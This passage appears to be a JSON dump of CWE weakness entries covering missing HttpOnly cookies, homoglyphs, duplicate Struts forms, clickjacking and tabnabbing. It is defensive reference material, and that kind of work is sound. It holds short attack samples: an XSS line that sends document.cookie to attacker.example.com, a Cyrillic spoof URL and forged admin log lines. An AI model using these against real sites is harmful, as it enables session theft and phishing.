{"ID": "1004", "Name": "Sensitive Cookie Without 'HttpOnly' Flag", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.", "ExtendedDescription": "The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "732", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Web Based", "Prevalence": "Undetermined"}], "BackgroundDetails": ["An HTTP cookie is a small piece of data attributed to a specific website and stored on the user's computer by the user's web browser. This data can be leveraged for a variety of purposes including saving information entered into form fields, recording user activity, and for authentication purposes. Cookies used to save or record information generated by the user are accessed and modified by script code embedded in a web page. While cookies used for authentication are created by the website's server and sent to the user to be attached to future requests. These authentication cookies are often not meant to be accessed by the web page sent to the user, and are instead just supposed to be attached to future requests to verify authentication details."], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties."}, {"Scope": ["Integrity"], "Impact": ["Gain Privileges or Assume Identity"], "Note": "If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Leverage the HttpOnly flag when setting a sensitive cookie in a response.", "Effectiveness": "High", "EffectivenessNotes": "While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client."}, {"BodyText": "The snippet of code below establishes a new cookie to hold the sessionID."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tString sessionID = generateSessionId();\n\tCookie c = new Cookie(\"session_id\", sessionID);\n\tresponse.addCookie(c);\n```"}, {"BodyText": "The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:"}, {"Nature": "Attack", "Language": "JavaScript", "ExampleCode": "```\n\tdocument.write('<img src=\"http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '\">'\n```"}, {"BodyText": "When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie."}, {"BodyText": "To mitigate the risk, use the setHttpOnly(true) method."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tString sessionID = generateSessionId();\n\tCookie c = new Cookie(\"session_id\", sessionID);\n\tc.setHttpOnly(true);\n\tresponse.addCookie(c);\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2022-24045", "Description": "Web application for a room automation system has client-side Javascript that sets a sensitive cookie without the HTTPOnly security attribute, allowing the cookie to be accessed.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-24045"}, {"Reference": "CVE-2014-3852", "Description": "CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header, allowing remote attackers to obtain potentially sensitive information via script access to this cookie.", "Link": "https://www.cve.org/CVERecord?id=CVE-2014-3852"}, {"Reference": "CVE-2015-4138", "Description": "Appliance for managing encrypted communications does not use HttpOnly flag.", "Link": "https://www.cve.org/CVERecord?id=CVE-2015-4138"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-21939", "Description": "Sensitive Cookie Without 'HttpOnly' Flag vulnerability in Johnson Controls System Configuration Tool (SCT) version 14 prior to 14.2.3 and version 15 prior to 15.0.3 could allow access to the cookie."}, {"Reference": "CVE-2022-25151", "Description": "Within the Service Desk module of the ITarian platform (SAAS and on-premise), a remote attacker can obtain sensitive information, caused by the failure to set the HTTP Only flag. A remote attacker could exploit this vulnerability to gain access to the management interface by using this vulnerability in combination with a successful Cross-Site Scripting attack on a user."}, {"Reference": "CVE-2022-25172", "Description": "An information disclosure vulnerability exists in the web interface session cookie functionality of InHand Networks InRouter302 V3.5.4. The session cookie misses the HttpOnly flag, making it accessible via JavaScript and thus allowing an attacker, able to perform an XSS attack, to steal the session cookie."}, {"Reference": "CVE-2022-39207", "Description": "Onedev is an open source, self-hosted Git Server with CI/CD and Kanban. During CI/CD builds, it is possible to save build artifacts for later retrieval. They can be accessed through OneDev's web UI after the successful run of a build. These artifact files are served by the webserver in the same context as the UI without any further restrictions. This leads to Cross-Site Scripting (XSS) when a user creates a build artifact that contains HTML. When accessing the artifact, the content is rendered by the browser, including any JavaScript that it contains. Since all cookies (except for the rememberMe one) do not set the HttpOnly flag, an attacker could steal the session of a victim and use it to impersonate them. To exploit this issue, attackers need to be able to modify the content of artifacts, which usually means they need to be able to modify a project's build spec. The exploitation requires the victim to click on an attacker's link. It can be used to elevate privileges by targeting admins of a OneDev instance. In the worst case, this can lead to arbitrary code execution on the server, because admins can create Server Shell Executors and use them to run any command on the server. This issue has been patched in version 7.3.0. Users are advised to upgrade. There are no known workarounds for this issue."}, {"Reference": "CVE-2021-20355", "Description": "IBM Jazz Team Server 6.0.6, 6.0.6.1, 7.0, 7.0.1, and 7.0.2 could allow a remote attacker to obtain sensitive information, caused by the failure to set the HTTPOnly flag. A remote attacker could exploit this vulnerability to obtain sensitive information from the cookie. IBM X-Force ID: 194891."}, {"Reference": "CVE-2021-27764", "Description": "Cookie without HTTPONLY flag set. NUMBER cookie(s) was set without Secure or HTTPOnly flags. The images show the cookie with the missing flag. (WebUI)"}, {"Reference": "CVE-2021-38879", "Description": "IBM Jazz Team Server 6.0.6, 6.0.6.1, 7.0, 7.0.1, and 7.0.2 could allow a remote attacker to obtain sensitive information, caused by the failure to set the HTTPOnly flag. A remote attacker could exploit this vulnerability to obtain sensitive information from the cookie. IBM X-Force ID: 209057."}, {"Reference": "CVE-2021-40649", "Description": "In Connx Version 6.2.0.1269 (20210623), a cookie can be issued by the application and not have the HttpOnly flag set."}, {"Reference": "CVE-2022-1655", "Description": "An Incorrect Permission Assignment for Critical Resource flaw was found in Horizon on Red Hat OpenStack. Horizon session cookies are created without the HttpOnly flag despite HorizonSecureCookies being set to true in the environmental files, possibly leading to a loss of confidentiality and integrity."}, {"Reference": "CVE-2022-22330", "Description": "IBM Control Desk 7.6.1 could allow a remote attacker to obtain sensitive information, caused by the failure to set the HTTPOnly flag. A remote attacker could exploit this vulnerability to obtain sensitive information from the cookie. IBM X-Force ID: 219126."}, {"Reference": "CVE-2022-24045", "Description": "A vulnerability has been identified in Desigo DXR2 (All versions < V01.21.142.5-22), Desigo PXC3 (All versions < V01.21.142.4-18), Desigo PXC4 (All versions < V02.20.142.10-10884), Desigo PXC5 (All versions < V02.20.142.10-10884). The application, after a successful login, sets the session cookie on the browser via client-side JavaScript code, without applying any security attributes (such as \u201cSecure\u201d, \u201cHttpOnly\u201d, or \u201cSameSite\u201d). Any attempts to browse the application via unencrypted HTTP protocol would lead to the transmission of all his/her session cookies in plaintext through the network. An attacker could then be able to sniff the network and capture sensitive information."}, {"Reference": "CVE-2022-32777", "Description": "An information disclosure vulnerability exists in the cookie functionality of WWBN AVideo 11.6 and dev master commit 3f7c0364. The session cookie and the pass cookie miss the HttpOnly flag, making them accessible via JavaScript. The session cookie also misses the secure flag, which allows the session cookie to be leaked over non-HTTPS connections. This could allow an attacker to steal the session cookie via crafted HTTP requests.This vulnerabilty is for the session cookie which can be leaked via JavaScript."}, {"Reference": "CVE-2022-32778", "Description": "An information disclosure vulnerability exists in the cookie functionality of WWBN AVideo 11.6 and dev master commit 3f7c0364. The session cookie and the pass cookie miss the HttpOnly flag, making them accessible via JavaScript. The session cookie also misses the secure flag, which allows the session cookie to be leaked over non-HTTPS connections. This could allow an attacker to steal the session cookie via crafted HTTP requests.This vulnerability is for the pass cookie, which contains the hashed password and can be leaked via JavaScript."}, {"Reference": "CVE-2022-4630", "Description": "Sensitive Cookie Without 'HttpOnly' Flag in GitHub repository lirantal/daloradius prior to master."}, {"Reference": "CVE-2022-39284", "Description": "CodeIgniter is a PHP full-stack web framework. In versions prior to 4.2.7 setting `$secure` or `$httponly` value to `true` in `Config\\\\Cookie` is not reflected in `set_cookie()` or `Response::setCookie()`. As a result cookie values are erroneously exposed to scripts. It should be noted that this vulnerability does not affect session cookies. Users are advised to upgrade to v4.2.7 or later. Users unable to upgrade are advised to manually construct their cookies either by setting the options in code or by constructing Cookie objects. Examples of each workaround are available in the linked GHSA."}, {"Reference": "CVE-2022-26281", "Description": "BigAnt Server v5.6.06 was discovered to contain an incorrect access control issue."}]}
{"ID": "1007", "Name": "Insufficient Visual Distinction of Homoglyphs Presented to User", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product displays information or identifiers to a user, but the display mechanism does not make it easy for the user to distinguish between visually similar or identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and perform an unintended, insecure action.", "ExtendedDescription": "\n\nSome glyphs, pictures, or icons can be semantically distinct to a program, while appearing very similar or identical to a human user. These are referred to as homoglyphs. For example, the lowercase \"l\" (ell) and uppercase \"I\" (eye) have different character codes, but these characters can be displayed in exactly the same way to a user, depending on the font. This can also occur between different character sets. For example, the Latin capital letter \"A\" and the Greek capital letter \"\u0391\" (Alpha) are treated as distinct by programs, but may be displayed in exactly the same way to a user. Accent marks may also cause letters to appear very similar, such as the Latin capital letter grave mark \"\u00c0\" and its equivalent \"\u00c1\" with the acute accent.\n\n\nAdversaries can exploit this visual similarity for attacks such as phishing, e.g. by providing a link to an attacker-controlled hostname that looks like a hostname that the victim trusts. In a different use of homoglyphs, an adversary may create a back door username that is visually similar to the username of a regular user, which then makes it more difficult for a system administrator to detect the malicious username while reviewing logs.\n", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "451", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Resultant"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Web Based", "Prevalence": "Sometimes"}], "AlternateTerms": [{"Term": "Homograph Attack", "Description": "\"Homograph\" is often used as a synonym of \"homoglyph\" by researchers, but according to Wikipedia, a homograph is a word that has multiple, distinct meanings."}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "This weakness may occur when characters from various character sets are allowed to be interchanged within a URL, username, email address, etc. without any notification to the user or underlying system being used."}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality"], "Impact": ["Other"], "Note": "An attacker may ultimately redirect a user to a malicious website, by deceiving the user into believing the URL they are accessing is a trusted domain. However, the attack can also be used to forge log entries by using homoglyphs in usernames. Homoglyph manipulations are often the first step towards executing advanced attacks such as stealing a user's credentials, Cross-Site Scripting (XSS), or log forgery. If an attacker redirects a user to a malicious site, the attacker can mimic a trusted domain to steal account credentials and perform actions on behalf of the user, without the user's knowledge. Similarly, an attacker could create a username for a website that contains homoglyph characters, making it difficult for an admin to review logs and determine which users performed which actions."}], "DetectionMethods": [{"Method": "Manual Dynamic Analysis", "Description": "If utilizing user accounts, attempt to submit a username that contains homoglyphs. Similarly, check to see if links containing homoglyphs can be sent via email, web browsers, or other mechanisms.", "Effectiveness": "Moderate"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "\n\nUse a browser that displays Punycode for IDNs in the URL and status bars, or which color code various scripts in URLs.\n\n\nDue to the prominence of homoglyph attacks, several browsers now help safeguard against this attack via the use of Punycode. For example, Mozilla Firefox and Google Chrome will display IDNs as Punycode if top-level domains do not restrict which characters can be used in domain names or if labels mix scripts for different languages.\n"}, {"Phase": ["Implementation"], "Description": "\n\nUse an email client that has strict filters and prevents messages that mix character sets to end up in a user's inbox.\n\n\nCertain email clients such as Google's GMail prevent the use of non-Latin characters in email addresses or in links contained within emails. This helps prevent homoglyph attacks by flagging these emails and redirecting them to a user's spam folder.\n"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following looks like a simple, trusted URL that a user may frequently access."}, {"Nature": "Attack", "ExampleCode": "```\n\thttp://www.\u0435x\u0430m\u0440l\u0435.\u0441\u043em\n```"}, {"BodyText": "However, the URL above is comprised of Cyrillic characters that look identical to the expected ASCII characters. This results in most users not being able to distinguish between the two and assuming that the above URL is trusted and safe. The \"e\" is actually the \"CYRILLIC SMALL LETTER IE\" which is represented in HTML as the character &#x435, while the \"a\" is actually the \"CYRILLIC SMALL LETTER A\" which is represented in HTML as the character &#x430. The \"p\", \"c\", and \"o\" are also Cyrillic characters in this example. Viewing the source reveals a URL of \"http://www.&#x435;x&#x430;m&#x440;l&#x435;.&#x441;&#x43e;m\". An adversary can utilize this approach to perform an attack such as a phishing attack in order to drive traffic to a malicious website."}]}, {"Entries": [{"IntroText": "The following displays an example of how creating usernames containing homoglyphs can lead to log forgery."}, {"BodyText": "Assume an adversary visits a legitimate, trusted domain and creates an account named \"admin\", except the 'a' and 'i' characters are Cyrillic characters instead of the expected ASCII. Any actions the adversary performs will be saved to the log file and look like they came from a legitimate administrator account."}, {"Nature": "Result", "ExampleCode": "```\n\t123.123.123.123 \u0430dm\u0456n [17/Jul/2017:09:05:49 -0400] \"GET /example/users/userlist HTTP/1.1\" 401 12846\n\t 123.123.123.123 \u0430dm\u0456n [17/Jul/2017:09:06:51 -0400] \"GET /example/users/userlist HTTP/1.1\" 200 4523\n\t 123.123.123.123 admin [17/Jul/2017:09:10:02 -0400] \"GET /example/users/editusers HTTP/1.1\" 200 6291\n\t 123.123.123.123 \u0430dm\u0456n [17/Jul/2017:09:10:02 -0400] \"GET /example/users/editusers HTTP/1.1\" 200 6291\n```"}, {"BodyText": "Upon closer inspection, the account that generated three of these log entries is \"&#x430;dm&#x456;n\". Only the third log entry is by the legitimate admin account. This makes it more difficult to determine which actions were performed by the adversary and which actions were executed by the legitimate \"admin\" account."}]}], "ObservedExamples": [{"Reference": "CVE-2013-7236", "Description": "web forum allows impersonation of users with homoglyphs in account names", "Link": "https://www.cve.org/CVERecord?id=CVE-2013-7236"}, {"Reference": "CVE-2012-0584", "Description": "Improper character restriction in URLs in web browser", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0584"}, {"Reference": "CVE-2009-0652", "Description": "Incomplete denylist does not include homoglyphs of \"/\" and \"?\" characters in URLs", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0652"}, {"Reference": "CVE-2017-5015", "Description": "web browser does not convert hyphens to punycode, allowing IDN spoofing in URLs", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5015"}, {"Reference": "CVE-2005-0233", "Description": "homoglyph spoofing using punycode in URLs and certificates", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0233"}, {"Reference": "CVE-2005-0234", "Description": "homoglyph spoofing using punycode in URLs and certificates", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0234"}, {"Reference": "CVE-2005-0235", "Description": "homoglyph spoofing using punycode in URLs and certificates", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0235"}], "RelatedAttackPatterns": ["632"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-2165", "Description": "Insufficient data validation in URL formatting in Google Chrome prior to 103.0.5060.53 allowed a remote attacker to perform domain spoofing via IDN homographs via a crafted domain name."}, {"Reference": "CVE-2022-26843", "Description": "Insufficient visual distinction of homoglyphs presented to user in the Intel(R) oneAPI DPC++/C++ Compiler before version 2022.1 for Intel(R) oneAPI Toolkits before version 2022.2 may allow an unauthenticated user to potentially enable escalation of privilege via network access."}, {"Reference": "CVE-2022-47524", "Description": "F-Secure SAFE Browser 19.1 before 19.2 for Android allows an IDN homograph attack."}]}
{"ID": "102", "Name": "Struts: Duplicate Validation Forms", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses multiple validation forms with the same name, which might cause the Struts Validator to validate a form that the programmer does not expect.", "ExtendedDescription": "If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations, possibly leading to resultant weaknesses. Moreover, it indicates that the validation logic is not up-to-date, and can indicate that other, more subtle validation errors are present.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "694", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "1173", "ViewID": "1000"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Unexpected State"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "The DTD or schema validation will not catch the duplicate occurrence of the same form name. To find the issue in the implementation, manual checks or automated static analysis could be applied to the xml configuration files."}], "DemonstrativeExamples": [{"ID": "DX-221", "Entries": [{"IntroText": "These two Struts validation forms have the same name."}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t <form-validation> \n\t\t <formset> \n\t\t\t <form name=\"ProjectForm\"> ... </form>\n\t\t\t <form name=\"ProjectForm\"> ... </form> \n\t\t </formset> \n\t </form-validation> \n```"}, {"BodyText": "It is not certain which form will be used by Struts. It is critically important that validation logic be maintained and kept in sync with the rest of the product."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1021", "Name": "Improper Restriction of Rendered UI Layers or Frames", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with.", "ExtendedDescription": "A web application is expected to place restrictions on whether it is allowed to be rendered within frames, iframes, objects, embed or applet elements. Without the restrictions, users can be tricked into interacting with the application when they were not intending to.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "441", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "610", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "451", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Technology", "Class": "Web Based", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "Clickjacking"}, {"Term": "UI Redress Attack"}, {"Term": "Tapjacking", "Description": "\"Tapjacking\" is similar to clickjacking, except it is used for mobile applications in which the user \"taps\" the application instead of performing a mouse click."}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity", "Bypass Protection Mechanism", "Read Application Data", "Modify Application Data"], "Note": "An attacker can trick a user into performing actions that are masked and hidden from the user's view. The impact varies widely, depending on the functionality of the underlying application. For example, in a social media application, clickjacking could be used to trik the user into changing privacy settings."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "\n\nThe use of X-Frame-Options allows developers of web content to restrict the usage of their application within the form of overlays, frames, or iFrames. The developer can indicate from which domains can frame the content.\n\n\nThe concept of X-Frame-Options is well documented, but implementation of this protection mechanism is in development to cover gaps. There is a need for allowing frames from multiple domains.\n"}, {"Phase": ["Implementation"], "Description": "\n\nA developer can use a \"frame-breaker\" script in each page that should not be framed. This is very helpful for legacy browsers that do not support X-Frame-Options security feature previously mentioned.\n\n\nIt is also important to note that this tactic has been circumvented or bypassed. Improper usage of frames can persist in the web application through nested frames. The \"frame-breaking\" script does not intuitively account for multiple nested frames that can be presented to the user.\n"}, {"Phase": ["Implementation"], "Description": "This defense-in-depth technique can be used to prevent the improper usage of frames in web applications. It prioritizes the valid sources of data to be loaded into the application through the usage of declarative policies. Based on which implementation of Content Security Policy is in use, the developer should use the \"frame-ancestors\" directive or the \"frame-src\" directive to mitigate this weakness. Both directives allow for the placement of restrictions when it comes to allowing embedded content."}], "ObservedExamples": [{"Reference": "CVE-2017-7440", "Description": "E-mail preview feature in a desktop application allows clickjacking attacks via a crafted e-mail message", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-7440"}, {"Reference": "CVE-2017-5697", "Description": "Hardware/firmware product has insufficient clickjacking protection in its web user interface", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5697"}, {"Reference": "CVE-2017-4015", "Description": "Clickjacking in data-loss prevention product via HTTP response header.", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-4015"}, {"Reference": "CVE-2016-2496", "Description": "Tapjacking in permission dialog for mobile OS allows access of private storage using a partially-overlapping window.", "Link": "https://www.cve.org/CVERecord?id=CVE-2016-2496"}, {"Reference": "CVE-2015-1241", "Description": "Tapjacking in web browser related to page navigation and touch/gesture events.", "Link": "https://www.cve.org/CVERecord?id=CVE-2015-1241"}, {"Reference": "CVE-2017-0492", "Description": "System UI in mobile OS allows a malicious application to create a UI overlay of the entire screen to gain privileges.", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-0492"}], "RelatedAttackPatterns": ["103", "181", "222", "504", "506", "587", "654"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-20852", "Description": "Multiple vulnerabilities in the web interface of Cisco Webex Meetings could allow a remote attacker to conduct a cross-site scripting (XSS) attack or a frame hijacking attack against a user of the web interface. For more information about these vulnerabilities, see the Details section of this advisory."}, {"Reference": "CVE-2022-4105", "Description": "A stored XSS in a kiwi Test Plan can run malicious javascript which could be chained with an HTML injection to perform a UI redressing attack (clickjacking) and an HTML injection which disables the use of the history page."}, {"Reference": "CVE-2021-0386", "Description": "In onCreate of UsbConfirmActivity, there is a possible tapjacking vector due to an insecure default value. This could lead to local escalation of privilege with User execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-11Android ID: A-173421110"}, {"Reference": "CVE-2021-0391", "Description": "In onCreate() of ChooseTypeAndAccountActivity.java, there is a possible way to learn the existence of an account, without permissions, due to a tapjacking/overlay attack. This could lead to local escalation of privilege with User execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-11 Android-8.1 Android-9 Android-10Android ID: A-172841550"}, {"Reference": "CVE-2021-35237", "Description": "A missing HTTP header (X-Frame-Options) in Kiwi Syslog Server has left customers vulnerable to click jacking. Clickjacking is an attack that occurs when an attacker uses a transparent iframe in a window to trick a user into clicking on an actionable item, such as a button or link, to another server in which they have an identical webpage. The attacker essentially hijacks the user activity intended for the original server and sends them to the other server. This is an attack on both the user and the server. "}, {"Reference": "CVE-2022-20213", "Description": "In ApplicationsDetailsActivity of AndroidManifest.xml, there is a possible DoS due to a tapjacking/overlay attack. This could lead to local denial of service with no additional execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12Android ID: A-183410508"}, {"Reference": "CVE-2022-20226", "Description": "In finishDrawingWindow of WindowManagerService.java, there is a possible tapjacking due to improper input validation. This could lead to local escalation of privilege with User execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-12 Android-12LAndroid ID: A-213644870"}, {"Reference": "CVE-2022-1138", "Description": "Inappropriate implementation in Web Cursor in Google Chrome prior to 100.0.4896.60 allowed a remote attacker who had compromised the renderer process to obscure the contents of the Omnibox (URL bar) via a crafted HTML page."}, {"Reference": "CVE-2021-37788", "Description": "A vulnerability in the web UI of Gurock TestRail v5.3.0.3603 could allow an unauthenticated, remote attacker to affect the integrity of a device via a clickjacking attack. The vulnerability is due to insufficient input validation of iFrame data in HTTP requests that are sent to an affected device. An attacker could exploit this vulnerability by sending crafted HTTP packets with malicious iFrame data. A successful exploit could allow the attacker to perform a clickjacking attack where the user is tricked into clicking a malicious link."}, {"Reference": "CVE-2022-0110", "Description": "Incorrect security UI in Autofill in Google Chrome prior to 97.0.4692.71 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page."}, {"Reference": "CVE-2022-0455", "Description": "Inappropriate implementation in Full Screen Mode in Google Chrome on Android prior to 98.0.4758.80 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page."}]}
{"ID": "1022", "Name": "Use of Web Link to Untrusted Target with window.opener Access", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The web application produces links to untrusted external sites outside of its sphere of control, but it does not properly prevent the external site from modifying  security-critical properties of the window.opener object, such as the location property.", "ExtendedDescription": "When a user clicks a link to an external site (\"target\"), the target=\"_blank\" attribute causes the target site's contents to be opened in a new window or tab, which runs in the same process as the original page. The window.opener object records information about the original page that offered the link. If an attacker can run script on the target page, then they could read or modify certain properties of the window.opener object, including the location property - even if the original and target site are not the same origin. An attacker can modify the location property to automatically redirect the user to a malicious site, e.g. as part of a phishing attack. Since this redirect happens in the original window/tab - which is not necessarily visible, since the browser is focusing the display on the new target page - the user might not notice any suspicious redirection.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "266", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "JavaScript", "Prevalence": "Often"}, {"Type": "Technology", "Class": "Web Based", "Prevalence": "Often"}], "AlternateTerms": [{"Term": "tabnabbing"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "This weakness is introduced during the design of an application when the architect does not specify that a linked external document should not be able to alter the location of the calling page."}, {"Phase": "Implementation", "Note": "This weakness is introduced during the coding of an application when the developer does not include the noopener and/or noreferrer value for the rel attribute."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Alter Execution Logic"], "Note": "The user may be redirected to an untrusted page that contains undesired content or malicious script code."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Specify in the design that any linked external document must not be granted access to the location object of the calling page."}, {"Phase": ["Implementation"], "Description": "\n\nWhen creating a link to an external document using the <a> tag with a defined target, for example \"_blank\" or a named frame, provide the rel attribute with a value \"noopener noreferrer\".\n\n\nIf opening the external document in a new window via javascript, then reset the opener by setting it equal to null.\n"}, {"Phase": ["Implementation"], "Description": "\n\nDo not use \"_blank\" targets. However, this can affect the usability of the application.\n"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In this example, the application opens a link in a named window/tab without taking precautions to prevent the called page from tampering with the calling page's location in the browser."}, {"BodyText": "There are two ways that this weakness is commonly seen. The first is when the application generates an <a> tag is with target=\"_blank\" to point to a target site:"}, {"Nature": "Bad", "Language": "HTML", "ExampleCode": "```\n\t<a href=\"http://attacker-site.example.com/useful-page.html\" target=\"_blank\">\n```"}, {"BodyText": "If the attacker offers a useful page on this link (or compromises a trusted, popular site), then a user may click on this link. However, the attacker could use scripting code to modify the window.opener's location property to redirect the application to a malicious, attacker-controlled page - such as one that mimics the look and feel of the original application and convinces the user to re-enter authentication credentials, i.e. phishing:"}, {"Nature": "Attack", "Language": "JavaScript", "ExampleCode": "```\n\twindow.opener.location = 